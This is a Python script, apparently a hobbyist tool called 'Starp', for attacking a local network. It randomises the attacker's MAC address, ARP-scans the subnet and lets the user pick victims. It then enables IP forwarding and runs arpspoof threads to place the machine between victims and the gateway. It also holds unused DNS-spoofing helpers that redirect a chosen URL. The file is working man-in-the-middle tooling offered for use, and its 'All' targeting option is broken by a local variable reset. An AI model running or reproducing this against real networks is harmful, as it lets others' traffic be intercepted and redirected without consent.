#!/usr/bin/env python3

from os import geteuid
import subprocess
import netifaces
import sys
import time
from prettytable import PrettyTable
from netaddr import IPAddress
from scapy.all import ARP, Ether, srp
import threading

J = False

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    LG = '\033[0;49;92m'
    GREEN = '\033[0;49;32m'
    YELLOW = '\033[0;49;93m'
    DY = '\033[0;49;33m'
    RED = '\033[0;49;91m'
    DR = '\033[0;49;31m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE  = '\33[37m'

# Get network Interface + Gateway + Netmask
def get_interface():
    global interface
    gateways = netifaces.gateways()
    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
        interface = gateways['default'][netifaces.AF_INET][1]
    else:
        interface = None
    if interface == None:
        sys.exit(color.RED+"[-] No interface connected to a network was detected"+color.END)
    else:
        print(color.GREEN+"[+] Interface: "+color.YELLOW+interface+color.END)

# Change MAC of Interface
def change_mac():
    print(color.BLUE+"[~] Changing MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines():
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()

def reset_mac():
    print(color.BLUE+"[~] Restoring MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines():
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
    
def get_gateway():
    global gateway
    gateways = netifaces.gateways()
    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
        gateway = gateways['default'][netifaces.AF_INET][0]
    else:
        gateway = None
    if gateway == None:
        sys.exit(color.RED+"[-] An error has occured during fetching gateway"+color.END)
    else:
        print(color.GREEN+"[+] Gateway: "+color.YELLOW+gateway+color.END)

def get_netmask():
    global netmask, cidr
    ifaddrs = netifaces.ifaddresses(interface)
    if netifaces.AF_INET in ifaddrs:
        netmask = ifaddrs[netifaces.AF_INET][0].get('netmask')
    else:
        netmask = None
    if netmask == None:
        sys.exit(color.RED+"[-] An error has occured during fetching mask"+color.END)
    else:
        print(color.GREEN+"[+] Mask: "+color.YELLOW+netmask+color.END)
        cidr = '/'+str(IPAddress(netmask).netmask_bits())

# Get essid
def get_ssid():
    global essid
    try:
        out = subprocess.check_output(['iwgetid']).decode()
        essid = out.split('"')[1]
        print(color.GREEN+"[+] ESSID: "+color.YELLOW+essid+color.END)
    except:
        print(color.RED+"[-] An error has occured during fetching ESSID"+color.END)

def scan_network():
    global ip_dict
    ip_dict = {}
    i = 1
    net_table = PrettyTable()
    net_table.field_names = ["", "IP", "MAC"]
    
    arp = ARP(pdst=gateway+cidr)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    print(color.BLUE+"[~] Scanning network...\n"+color.END)
    result = srp(packet, timeout=3, verbose=0)[0]

    for s, x in result:
        ip_dict.update({i: x.psrc})
        net_table.add_row([str(i), str(x.psrc), str(x.hwsrc)])
        i+=1
        
    net_table.align = "l"
    net_table.align["MAC"] = "c"
    print("Available devices in the network:")
    print(net_table)

# Get target IP
def target():
    global target_ip, choice_ip, all
    print("[0] : "+"All")
    print(color.GREEN+"[R] : "+"Rescan Network"+color.END)
    print(color.RED+"[E] : "+"Exit"+color.END)
    print(color.PURPLE+"\nChoose an IP to spoof, rescan or exit"+color.END)
    choice_ip = ""
    while not set(choice_ip.split(" ")).issubset({str(key) for key in ip_dict.keys()}) and choice_ip != "R" and choice_ip != "E" and choice_ip != "0":
        choice_ip = input("Choice: ")
    if choice_ip == "E":
        reset_mac()
        sys.exit(color.RED+"Exiting..."+color.END)
    elif choice_ip == "R":
        scan_network()
        target()
    elif choice_ip == "0":
        all = True
    else:
        try:
            target_ip = ip_dict[int(''.join(choice_ip)[0])]
        except ValueError:
            reset_mac()
            sys.exit(color.RED+"[-] An error has occured\n Exiting..."+color.END)

# Enable Redirect
def redirect():
    cmd = 'echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward'
    print(color.BLUE+"\n[~] Enabling forwarding...\n"+color.END)
    res = subprocess.check_output(cmd, shell=True).decode()
    print(res)

# ARPSpoof
def arpspoof(ip1,ip2,pos):
    subprocess.run(['xterm', '-geometry', '110x24'+str(pos)+'0+0', '-hold', '-e', 'arpspoof', '-t', ip1, ip2, '-i', interface])

def attck_thread():
    global J
    threads = []
    all = False
    print(color.BLUE+"[~] Starting Attack..."+color.END)
    J = True
    if all:
        for w in ip_dict:
            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w], '+',))
            t2 = threading.Thread(target=arpspoof, args=(ip_dict[w], gateway, '-',))
            threads.append(t1)
            threads.append(t2)
        for i in threads:
            i.start()
        for i in threads:
            i.join()
    else:
        for i in choice_ip.split():
            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[int(i)], '+',))
            t2 = threading.Thread(target=arpspoof, args=(ip_dict[int(i)], gateway, '-',))
            threads.append(t1)
            threads.append(t2)
        for i in threads:
            i.start()
        for i in threads:
            i.join()

# Get URL
def get_url():
    global url 
    try:
        url = input("URL to be cloned: ")
    except:
        sys.exit()

# Create DNS file
def create_file():
    global dns_file
    dns_file = 'dns_file'
    with open(dns_file, 'w') as file:
        file.write(url+'\tlocalhost\nlocalhost\t'+url+'\n')
    file.close()

# DNSSpoof
def dnsspoof(file):
    subprocess.run(['xterm', '-geometry', '110x24+0-0', '-hold', '-e', 'dnsspoof', '-f', file, '-i', interface])


banner = '''
{2}  ____  _                   
{2} / ___|| |_ __ _ _ __ _ __  
{2} \___ \| __/ _` | '__| '_ \ 
{3}  ___) | || (_| | |  | |_) |
{3} |____/ \__\__,_|_|  | .__/ 
          {0}by kod34{3}   |_|                
{4}'''.format(color.RED, color.BLUE, color.PURPLE, color.YELLOW, color.END)


if geteuid() != 0:
    sys.exit(color.RED+"Run as root!"+color.END)
try:
    print(banner)
    print(color.BLUE+"[~] Fetching info..."+color.END)
    time.sleep(1)
    get_interface()
    get_gateway()
    get_netmask()
    get_ssid()
    change_mac()
    time.sleep(3)
    scan_network()
    target()
    
    redirect()

    attck_thread()
    
    print(color.GREEN+"[+] Job Done...\n"+color.END)
    reset_mac()
except KeyboardInterrupt as k:
    if J:
        print(color.GREEN+"[+] Job Done...\n"+color.END)
    else:
        print(color.RED+"[-] Keyboard Interrupt"+color.END)
    reset_mac()
    sys.exit(color.RED+"Exiting..."+color.END)

